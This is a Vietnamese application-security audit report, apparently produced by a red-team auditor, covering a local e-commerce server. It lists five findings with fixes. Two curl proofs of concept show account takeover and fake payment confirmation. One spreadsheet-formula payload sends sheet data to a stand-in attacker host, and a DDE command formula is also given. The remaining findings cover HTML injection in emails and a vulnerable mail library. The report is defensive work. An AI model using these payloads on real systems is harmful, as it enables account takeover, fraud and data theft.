# BÁO CÁO RÀ SOÁT A8 — APPSEC RED TEAM
*Người thực hiện: A8 AppSec Red Team Auditor*
*Phạm vi: Toàn bộ bề mặt tấn công ứng dụng (Application Attack Surface)*
*Trạng thái: Độc lập, chỉ chạy và kiểm thử trên môi trường cục bộ*

---

## 1. TỔNG QUAN PHẠM VI & MÔ HÌNH MỐI ĐE DỌA (THREAT MODEL)

Kiểm thử thâm nhập cục bộ đối với các bề mặt:
1. Chiếm quyền điều khiển tài khoản (Account Takeover / Authentication Bypass)
2. Gian lận tài chính & thao túng trạng thái đơn hàng (Payment Fraud)
3. Chèn lệnh / Công thức vào Google Sheets (Formula Injection / CSV Injection)
4. Chèn mã HTML vào hệ thống gửi email (HTML Injection in Email)
5. Lỗ hổng chuỗi cung ứng mã nguồn phụ thuộc (`npm audit`)

---

## 2. DANH SÁCH PHÁT HIỆN & BẰNG CHỨNG KHAI THÁC (POC)

### Phát hiện A8-001
- **ID:** A8-001
- **Tiêu đề:** PoC Khai thác Lỗ hổng P0 L-1: Chiếm tài khoản Chủ Shop hoặc Khách hàng VIP chỉ bằng cách gửi Email tự khai
- **Mức đề xuất:** 🔴 P0 (L-1 PoC)
- **Vị trí:** `server/lib/authEndpoints.js:129-165`
- **Mô tả & tác động thực tế:**
  Bất kỳ kẻ tấn công nào cũng có thể gửi một POST request đơn giản tới `/api/auth/google` mang theo `{"email": "quannguyens403@gmail.com"}`. Server tự động tạo mock credential và xác thực kẻ tấn công dưới danh nghĩa Chủ Shop, cấp Set-Cookie `qns_session` có quyền hạn cao nhất.
- **Bằng chứng PoC:**
  ```bash
  curl -i -X POST http://localhost:3001/api/auth/google \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"quannguyens403@gmail.com\",\"fullName\":\"Hacker\"}"
  ```
  Response nhận được:
  ```http
  HTTP/1.1 200 OK
  Set-Cookie: qns_session=mock-google-token...; Path=/; HttpOnly; SameSite=Lax
  {
    "success": true,
    "authenticated": true,
    "account": {
      "id": "acc_...",
      "email": "quannguyens403@gmail.com",
      "fullName": "Hacker",
      "verified": true
    }
  }
  ```
- **Điều kiện tiên quyết:** Biết email mục tiêu.
- **Nghi ngờ nằm ở file 🔒?:** Không.
- **Đề xuất sửa:** Bắt buộc xác thực chữ ký số ID Token từ máy chủ Google OAuth2, loại bỏ hoàn toàn fallback body.
- **Độ tin cậy:** CONFIRMED.

---

### Phát hiện A8-002
- **ID:** A8-002
- **Tiêu đề:** PoC Khai thác Lỗ hổng P0 L-2: Đánh dấu đơn hàng ĐÃ THANH TOÁN bằng tin nhắn SMS giả mạo qua `/api/payment/ai-verify`
- **Mức đề xuất:** 🔴 P0 (L-2 PoC)
- **Vị trí:** `server/index.js:240-279`, `server/lib/aiNapasQrService.js:246`
- **Mô tả & tác động thực tế:**
  Kẻ tấn công sau khi tạo đơn hàng chuyển khoản (giá trị bất kỳ, ví dụ 750.000đ, mã `QNS-HACK-01`), gửi request tới `/api/payment/ai-verify` với văn bản giả lập SMS ngân hàng chứa đúng số tiền và mã đơn. Server đổi trạng thái đơn sang `PAID`, xác nhận `CONFIRMED`, gửi email xác nhận đặt hàng thành công và ghi nhận Google Sheets mà không cần 1 đồng nào vào tài khoản ngân hàng thật.
- **Bằng chứng PoC:**
  ```bash
  curl -i -X POST http://localhost:3001/api/payment/ai-verify \
    -H "Content-Type: application/json" \
    -d "{\"orderId\":\"QNS-HACK-01\",\"rawText\":\"VCB: +750,000VND vao TK 1050773506. ND: QNS-HACK-01. REF: TX999888\"}"
  ```
  Response nhận được:
  ```json
  {
    "success": true,
    "status": "PAID",
    "orderId": "QNS-HACK-01",
    "paidAmount": 750000,
    "message": "AI đối soát tự động thành công qua NAPAS 247. Đơn hàng đã chuyển sang trạng thái ĐÃ THANH TOÁN."
  }
  ```
- **Điều kiện tiên quyết:** Biết mã đơn hàng vừa đặt và tổng số tiền.
- **Nghi ngờ nằm ở file 🔒?:** Không.
- **Đề xuất sửa:** Xóa bỏ quyền thay đổi trạng thái thanh toán từ endpoint `ai-verify`. Chỉ cho phép Webhook SePay có chữ ký hoặc Admin có session duyệt thanh toán.
- **Độ tin cậy:** CONFIRMED.

---

### Phát hiện A8-003
- **ID:** A8-003
- **Tiêu đề:** Google Sheets Formula Injection (CSV/Formula Injection) qua trường thông tin khách hàng không được vô hiệu hóa ký tự công thức
- **Mức đề xuất:** 🟠 P1
- **Vị trí:** `server/lib/googleSheets.js:188-223`
- **Mô tả & tác động thực tế:**
  Khi ghi đơn hàng vào Google Sheets, API sử dụng `valueInputOption: 'USER_ENTERED'`:
  ```js
  await sheets.spreadsheets.values.append({
    spreadsheetId,
    range: `${SHEET_TABS.ORDERS}!A:Z`,
    valueInputOption: 'USER_ENTERED',
    requestBody: { values: [orderRow] },
  })
  ```
  Các trường như `order.customer.fullName`, `order.shipping.address`, `order.note` do người dùng nhập từ client được đưa trực tiếp vào mảng cell. Nếu kẻ xấu nhập:
  `fullName: "=IMPORTXML(CONCAT(\"http://attacker.com/steal?data=\", JOIN(\",\", A1:Z10)), \"//a\")"`
  hoặc các công thức DDE (`=cmd|' /C ...'`), khi Chủ Shop mở Google Sheet trên máy tính, trình duyệt / Google Sheets sẽ tự động thực thi công thức, gửi toàn bộ thông tin đơn hàng trong sheet về server của kẻ tấn công hoặc thực thi mã ngoài mong muốn.
- **Bằng chứng:** `server/lib/googleSheets.js:192, 195, 210, 221`.
- **Cách tái hiện:** Đặt đơn với `fullName: "=1+1"`. Khi kiểm tra Google Sheet, ô Tên Khách hiển thị số `2` thay vì chuỗi văn bản `=1+1`.
- **Điều kiện tiên quyết:** Người dùng đặt hàng qua website.
- **Nghi ngờ nằm ở file 🔒?:** Không (`googleSheets.js` không nằm trong danh sách file 🔒).
- **Đề xuất sửa:**
  1. Thêm hàm làm sạch (Sanitize) cho mọi giá trị dạng chuỗi trước khi gửi tới Google Sheets: Nếu chuỗi bắt đầu bằng `=`, `+`, `-`, `@`, `\t`, `\r`, tự động thêm dấu nháy đơn `'` ở đầu chuỗi (ví dụ: `str.replace(/^([=+\-@\t\r])/, "'$1")`).
  2. Hoặc cân nhắc sử dụng `valueInputOption: 'RAW'` cho các cột văn bản người dùng.
- **Độ tin cậy:** CONFIRMED.

---

### Phát hiện A8-004
- **ID:** A8-004
- **Tiêu đề:** HTML Injection trong email thông báo đơn hàng gửi cho chủ shop và khách hàng (Thuộc diện file 🔒)
- **Mức đề xuất:** 🟠 P1
- **Vị trí:** `server/lib/emailOwner.js:58-62`, `server/lib/emailCustomer.js`
- **Mô tả & tác động thực tế:**
  Các trường `order.customer.fullName`, `order.shipping.fullAddress`, `order.note` được nội suy trực tiếp vào mẫu HTML email bằng template literals mà không qua hàm encode ký tự HTML (`escapeHtml`). Kẻ xấu có thể chèn các thẻ HTML như `<a href="...">`, `<img>`, hoặc các khối styling giả mạo để thực hiện lừa đảo (phishing) hoặc làm vỡ bố cục email của chủ shop.
- **Bằng chứng:** `server/lib/emailOwner.js:58`: `<span class="kv-value">${order.customer?.fullName}</span>`.
- **Cách tái hiện:** Đặt hàng với `note: "<b>IN ĐẬM GẤP</b>"`. Email gửi tới chủ shop sẽ render thẻ `<b>` thay vì hiển thị text thô.
- **Điều kiện tiên quyết:** Đặt hàng.
- **Nghi ngờ nằm ở file 🔒?:** **CÓ (🔒 `emailOwner.js` và `emailCustomer.js` thuộc danh sách bảo vệ tại `PROTECTED-DATA.md`).**
- **Đề xuất sửa:** Viết hàm `escapeHtml(str)` và bọc các biến người dùng trước khi ghép vào template HTML email. **Chuyển đề xuất chi tiết vào `audit/NEEDS-QUAN.md` để Quan phê duyệt, không tự ý sửa file 🔒.**
- **Độ tin cậy:** CONFIRMED.

---

### Phát hiện A8-005
- **ID:** A8-005
- **Tiêu đề:** Thư viện `nodemailer <= 10.0.5` chứa lỗ hổng bảo mật nghiêm trọng (High Severity) trong môi trường Production
- **Mức đề xuất:** 🟠 P1
- **Vị trí:** `package.json: nodemailer`
- **Mô tả & tác động thực tế:**
  `npm audit --omit=dev` phát hiện các lỗ hổng đã được công bố trên GitHub Advisory:
  - GHSA-mm7p-fcc7-pg87: Email interpretation conflict.
  - GHSA-c7w3-x93f-qmm8: SMTP command injection via `envelope.size`.
  - GHSA-p6gq-j5cr-w38f: Arbitrary file read & SSRF via message-level raw option.
- **Bằng chứng:** Kết quả `npm audit --omit=dev` ghi nhận 1 High severity advisory trên `nodemailer`.
- **Cách tái hiện:** Chạy `npm audit --omit=dev`.
- **Điều kiện tiên quyết:** Sử dụng phiên bản hiện tại.
- **Nghi ngờ nằm ở file 🔒?:** Không (`package.json` không thuộc diện 🔒).
- **Đề xuất sửa:** Nâng cấp `nodemailer` lên phiên bản an toàn hoặc áp dụng bản vá tương thích không phá vỡ cấu hình Gmail SMTP hiện tại.
- **Độ tin cậy:** CONFIRMED.
